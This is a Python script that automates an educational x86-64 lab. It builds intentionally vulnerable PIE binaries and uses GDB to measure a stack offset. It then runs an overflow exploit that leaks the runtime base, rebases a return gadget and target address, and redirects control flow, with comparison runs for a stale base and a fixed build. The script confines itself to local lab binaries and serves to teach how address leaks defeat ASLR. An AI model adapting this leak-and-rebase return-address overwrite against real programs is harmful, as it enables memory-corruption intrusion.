#!/usr/bin/env python3
"""Build and measure the local x86-64 Lab 06; no external target is accepted.

Lab 06 shows that a same-process text-pointer leak defeats PIE: the overflow
that fails under ASLR in Lab 05 succeeds once the per-process base is known.

Three measured cases, three repeats each (9 trials):
  bypass : pie_bypass, leak the base, rebase the target -> redirection (status 42)
  stale  : pie_bypass, reuse a fixed wrong base (the Lab 05 situation) -> SIGSEGV
  fixed  : pie_fixed, same leak and rebased payload -> bounds check rejects it
"""
import argparse
from datetime import datetime, timezone
import hashlib
import json
import os
from pathlib import Path
import platform
import re
import resource
import shlex
import shutil
import signal
import struct
import subprocess
import sys
import threading

ROOT = Path(__file__).resolve().parents[1]
BINARIES = ("pie_bypass", "pie_fixed")
TARGET_MARKER = b"TARGET: control flow redirected\n"
RETURNED = b"returned from overflow\n"
# The stale case reuses a base from a DIFFERENT run than the one being attacked,
# which models Lab 05's situation: an address that was valid in some process but
# is wrong for this randomized one. The collector leaks a base from a separate
# `leak`-only invocation and feeds it to a fresh session; under ASLR the two
# bases differ (asserted per run), so the target is unmapped and the write faults.


def require(condition, message):
    if not condition:
        raise RuntimeError(str(message))


def read_u64(blob, name):
    match = re.search(rb"^([0-9a-fA-F]+)\s+[tT]\s+" + re.escape(name) + rb"$", blob, re.MULTILINE)
    require(match, name.decode() + " symbol not found")
    return int(match[1], 16)


def capture(label, output):
    require(platform.system() == "Linux" and platform.machine() == "x86_64",
            "requires x86-64 Linux")
    require(os.geteuid() != 0, "run the lab as an ordinary user, not root")
    require(not any(char in str(output) for char in "\r\n"), "output path cannot contain newlines")
    cc = os.environ.get("CC", "gcc")
    for tool in (cc, "make", "nm", "readelf", "objdump", "gdb", "getconf"):
        require(shutil.which(tool), "required tool not found: " + tool)
    aslr = Path("/proc/sys/kernel/randomize_va_space").read_text().strip()
    require(aslr != "0", "ASLR is disabled; the PIE leak result would be meaningless")
    output.mkdir()  # Exclusive, including dangling symlinks.
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
    env = dict(os.environ, LC_ALL="C", SHELL="/bin/sh")

    def record(command, stem, **kwargs):
        (output / (stem + ".command.json")).write_text(json.dumps(command) + "\n")
        try:
            result = subprocess.run(command, capture_output=True, timeout=30, env=env, **kwargs)
        except subprocess.TimeoutExpired as error:
            (output / (stem + ".stdout.txt")).write_bytes(error.stdout or b"")
            (output / (stem + ".stderr.txt")).write_bytes(error.stderr or b"")
            (output / (stem + ".timeout.json")).write_text(json.dumps({"timeout_seconds": 30}) + "\n")
            raise
        (output / (stem + ".stdout.txt")).write_bytes(result.stdout)
        (output / (stem + ".stderr.txt")).write_bytes(result.stderr)
        (output / (stem + ".status.json")).write_text(json.dumps({"returncode": result.returncode}) + "\n")
        return result

    metadata = {"schema_version": 1, "label": label, "label_is_operator_supplied": True,
                "captured_at_utc": datetime.now(timezone.utc).isoformat(),
                "platform": platform.platform(), "architecture": platform.machine(),
                "python": sys.version, "CC": cc, "CFLAGS": env.get("CFLAGS", "-Wall -Wextra"),
                "LDFLAGS": env.get("LDFLAGS", ""), "aslr_before": aslr}
    (output / "environment.json").write_text(json.dumps(metadata, indent=2) + "\n")
    shutil.copy2(__file__, output / "capture-pie-leak.py")
    shutil.copy2("/etc/os-release", output / "os-release.txt")
    lab = output / "06-pie-leak-bypass"
    shutil.copytree(ROOT / "labs/06-pie-leak-bypass/src", lab / "src")
    shutil.copy2(ROOT / "labs/06-pie-leak-bypass/Makefile", lab)
    for name, command in (("compiler", [cc, "--version"]), ("compiler-target", [cc, "-dumpmachine"]),
                          ("binutils", ["readelf", "--version"]), ("gdb-version", ["gdb", "--version"]),
                          ("libc", ["getconf", "GNU_LIBC_VERSION"])):
        record(command, name).check_returncode()
    record(["make", "--always-make", "CC=" + cc, "CFLAGS=" + metadata["CFLAGS"],
            "LDFLAGS=" + metadata["LDFLAGS"]], "build", cwd=lab).check_returncode()

    # Both binaries must be position-independent (ET_DYN) with a non-executable,
    # RELRO/BIND_NOW layout and no stack guard: the leak, not a canary, is the
    # studied variable.
    for binary in BINARIES:
        elf = record(["readelf", "-W", "-h", "-l", "-d", "-s", str(lab / binary)], binary + ".readelf")
        elf.check_returncode()
        text = elf.stdout.decode()
        require("Advanced Micro Devices X86-64" in text and "ELF64" in text, "unsupported ELF target")
        require(re.search(r"Type:\s+DYN", text), binary + " is not position-independent")
        require("__stack_chk_fail" not in text, "unexpected stack guard symbol")
        stack = next(line for line in text.splitlines() if "GNU_STACK" in line)
        require("RW " in stack and "RWE" not in stack, "executable stack requested")
        require("GNU_RELRO" in text and "BIND_NOW" in text, "missing common linker hardening")
        record(["objdump", "-d", str(lab / binary)], binary + ".disassembly").check_returncode()

    # Link-time addresses from the local build artifacts (not a disclosure): the
    # reference/target distance and an alignment `ret` gadget, as in Lab 05.
    symbols = record(["nm", "--defined-only", str(lab / "pie_bypass")], "symbols")
    symbols.check_returncode()
    reference_link = read_u64(symbols.stdout, b"reference_symbol")
    target_link = read_u64(symbols.stdout, b"redirect_target")
    disassembly = record(["objdump", "-d", "--disassemble=overflow", str(lab / "pie_bypass")], "overflow-disasm")
    disassembly.check_returncode()
    returns = re.findall(rb"^\s*([0-9a-f]+):\s+c3\s+ret\s*$", disassembly.stdout, re.MULTILINE)
    require(len(returns) == 1, "expected one plain ret instruction in overflow")
    alignment_ret_link = int(returns[0], 16)

    # Measure the saved-return offset with GDB, exactly as Lab 05 does.
    (output / "probe.input").write_bytes(b"16\n" + b"A" * 16)
    probe = record(["gdb", "--nx", "--quiet", "--batch", "-iex", "set auto-load off",
                    "-ex", "set disable-randomization off", "-ex", "break overflow",
                    "-ex", "run session < " + shlex.quote(str(output / "probe.input")),
                    "-ex", 'printf "LAB06_OFFSET=%ld\\n", (long)(($rbp + 8) - (long)&buffer)',
                    "--args", str(lab / "pie_bypass"), "session"], "offset")
    probe.check_returncode()
    matches = re.findall(rb"LAB06_OFFSET=(\d+)", probe.stdout)
    require(len(matches) == 1, "GDB could not measure the saved-return offset")
    offset = int(matches[0])
    require(32 <= offset <= 128, "unsupported saved-return offset")

    payload_info = {"saved_return_offset": offset, "payload_bytes": offset + 16,
                    "reference_symbol_link": hex(reference_link), "redirect_target_link": hex(target_link),
                    "target_minus_reference": hex(target_link - reference_link),
                    "alignment_ret_link": hex(alignment_ret_link),
                    "address_source": "link-time offsets from the local PIE build artifacts, "
                                       "rebased with the runtime base from a same-process leak; "
                                       "the link-time delta is not a disclosure, only the runtime base is",
                    "layout": "A * saved-return offset | little-endian alignment_ret | little-endian redirect_target"}
    (output / "payload.json").write_text(json.dumps(payload_info, indent=2) + "\n")

    def leak_once(binary, stem):
        """Run `binary leak` and return its disclosed base.

        Uses `record`, so the raw stdout/stderr and exit status of the separate
        leak are kept as artifacts; the stale case's input is thus reproducible,
        not just the base it computed.
        """
        result = record([str(binary), "leak"], stem)
        result.check_returncode()
        match = re.search(rb"LEAK (0x[0-9a-f]+)", result.stdout)
        require(match, "no leak line from " + str(binary) + " leak")
        return int(match[1], 16) - reference_link

    def run_session(binary, stale, stem):
        """One attack session against `binary`.

        The program discloses reference_symbol() on its first stdout line, then
        reads a byte count and payload. For the leak-based attack the target is
        rebased to this session's own base. For the stale case `stale` holds a
        base leaked from a DIFFERENT process, modelling Lab 05: valid once, wrong
        now. Returns the session's own leaked reference and the base attacked.
        """
        process = subprocess.Popen([str(binary), "session"], stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)
        try:
            # readline() on the child's stdout can block if the program never
            # prints; bound the leak read with a timer that kills the process.
            timer = threading.Timer(30, process.kill)
            timer.start()
            try:
                leak_line = process.stdout.readline()
            finally:
                timer.cancel()
            match = re.search(rb"LEAK (0x[0-9a-f]+)", leak_line)
            require(match, "no leak line from " + str(binary) + " session")
            reference_run = int(match[1], 16)
            attacked_base = stale if stale is not None else reference_run - reference_link
            target_run = attacked_base + target_link
            ret_run = attacked_base + alignment_ret_link
            payload = b"A" * offset + struct.pack("<QQ", ret_run, target_run)
            header = ("%d\n" % len(payload)).encode()
            stdout, stderr = process.communicate(header + payload, timeout=30)
        except subprocess.TimeoutExpired:
            process.kill()
            stdout, stderr = process.communicate()
            (output / (stem + ".timeout.json")).write_text(json.dumps({"timeout_seconds": 30}) + "\n")
            raise
        (output / (stem + ".leak.txt")).write_bytes(leak_line)
        (output / (stem + ".stdout.txt")).write_bytes(stdout)
        (output / (stem + ".stderr.txt")).write_bytes(stderr)
        (output / (stem + ".status.json")).write_text(json.dumps({"returncode": process.returncode}) + "\n")
        return process.returncode, stdout, stderr, reference_run, attacked_base

    cases = (("bypass", lab / "pie_bypass", False),
             ("stale", lab / "pie_bypass", True),
             ("fixed", lab / "pie_fixed", False))
    observations = []
    seen_bases = set()
    for mode, binary, use_stale in cases:
        for repeat in range(1, 4):
            stem = "{}.{}".format(mode, repeat)
            stale_base = None
            if use_stale:
                # A base from a separate process. Under ASLR it differs from the
                # session's own base (asserted below), standing in for Lab 05's
                # stale address; the runtime effect is then measured, not assumed.
                stale_base = leak_once(binary, stem + ".source")
            rc, stdout, stderr, reference_run, attacked_base = run_session(binary, stale_base, stem)
            seen_bases.add(reference_run)
            session_base = reference_run - reference_link
            if use_stale:
                require(attacked_base != session_base,
                        "stale and session base coincided; ASLR not randomizing")
            row = {"mode": mode, "binary": binary.name, "repeat": repeat, "returncode": rc,
                   "signal": signal.Signals(-rc).name if rc < 0 else None,
                   "target_reached": TARGET_MARKER in stdout,
                   "returned_from_overflow": RETURNED in stdout,
                   "leaked_reference": hex(reference_run),
                   "attacked_base": hex(attacked_base), "stale_base": use_stale}
            observations.append(row)
            (output / "observations.json").write_text(json.dumps(observations, indent=2) + "\n")
            if mode == "bypass":
                require(rc == 42 and row["target_reached"] and not row["returned_from_overflow"],
                        "leak+rebase did not redirect: " + json.dumps(row))
            elif mode == "stale":
                require(rc == -signal.SIGSEGV and not row["target_reached"],
                        "stale base did not fault as in Lab 05: " + json.dumps(row))
            else:  # fixed
                require(rc == 2 and b"rejected:" in stderr and not row["target_reached"]
                        and b"copy completed:" not in stdout,
                        "bounds check did not reject the rebased payload: " + json.dumps(row))
    # ASLR must stay on and actually vary the base across runs, or the leak is moot.
    require(len(seen_bases) > 1, "leaked base never changed; ASLR not randomizing the text segment")

    # Measure, rather than assume, what the stale fault is. Replay a stale attack
    # under GDB: leak a base from one process, rebase the alignment gadget and the
    # target to it, and feed a fresh session. The epilogue `ret` transfers to the
    # stale gadget address; GDB reports the faulting instruction pointer. The run
    # records the fault PC together with the attacked stale base and this process's
    # own base, and asserts the fault PC lies in the stale text range
    # (base .. base + text_size), not in this process's own mapping. That shows
    # control was redirected to the stale (wrong-process) address range and
    # faulted there, which is stronger than "the bases differ" without over-
    # claiming that the fault PC equals one specific byte.
    stale_source = leak_once(lab / "pie_bypass", "stale-fault.source")
    target_stale = stale_source + target_link
    ret_stale = stale_source + alignment_ret_link
    (output / "stale-fault.input").write_bytes(
        ("%d\n" % (offset + 16)).encode() + b"A" * offset + struct.pack("<QQ", ret_stale, target_stale))
    fault = record(["gdb", "--nx", "--quiet", "--batch", "-iex", "set auto-load off",
                    "-ex", "set disable-randomization off", "-ex", "run session < "
                    + shlex.quote(str(output / "stale-fault.input")),
                    "-ex", 'printf "LAB06_FAULT_PC=%p\\n", $pc',
                    "-ex", 'printf "LAB06_SESSION_REF=%p\\n", &reference_symbol',
                    "--args", str(lab / "pie_bypass"), "session"], "stale-fault")
    fault_text = fault.stdout
    pc_match = re.search(rb"LAB06_FAULT_PC=(0x[0-9a-f]+)", fault_text)
    session_ref = re.search(rb"LAB06_SESSION_REF=(0x[0-9a-f]+)", fault_text)
    require(b"SIGSEGV" in fault_text and pc_match and session_ref, "stale fault not observed under GDB")
    fault_pc = int(pc_match[1], 16)
    session_base = int(session_ref[1], 16) - reference_link
    # Text segment size of this PIE, to bound the stale range the fault should hit.
    sizes = record(["readelf", "-WS", str(lab / "pie_bypass")], "stale-fault.sections")
    sizes.check_returncode()
    text = next(line for line in sizes.stdout.decode().splitlines() if "] .text" in line)
    text_end = int(text.split()[4], 16) + int(text.split()[5], 16)
    in_stale = stale_source <= fault_pc < stale_source + text_end
    in_session = session_base <= fault_pc < session_base + text_end
    require(in_stale and not in_session,
            "stale fault PC is not in the stale text range: " + hex(fault_pc))
    (output / "stale-fault.json").write_text(json.dumps(
        {"fault_pc": hex(fault_pc), "stale_base": hex(stale_source),
         "session_base": hex(session_base), "text_size": hex(text_end),
         "fault_in_stale_text_range": True, "fault_in_session_text_range": False}, indent=2) + "\n")

    metadata["aslr_after"] = Path("/proc/sys/kernel/randomize_va_space").read_text().strip()
    (output / "environment.json").write_text(json.dumps(metadata, indent=2) + "\n")
    require(metadata["aslr_before"] == metadata["aslr_after"], "ASLR setting changed during capture")
    manifest = [hashlib.sha256(path.read_bytes()).hexdigest() + "  " + str(path.relative_to(output))
                for path in sorted(output.rglob("*")) if path.is_file()]
    (output / "SHA256SUMS").write_text("\n".join(manifest) + "\n")
    (output / "COMPLETE").write_text("Lab 06 checks passed; label: " + label + "\n")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("label", choices=("host", "modern"))
    parser.add_argument("output", type=lambda value: Path(value).absolute())
    args = parser.parse_args()
    try:
        capture(args.label, args.output)
    except (OSError, ValueError, RuntimeError, StopIteration, subprocess.SubprocessError) as error:
        print("Capture failed (partial evidence retained): " + str(error), file=sys.stderr)
        return 1
    print("Lab 06 captured in " + str(args.output))
    return 0


if __name__ == "__main__":
    sys.exit(main())
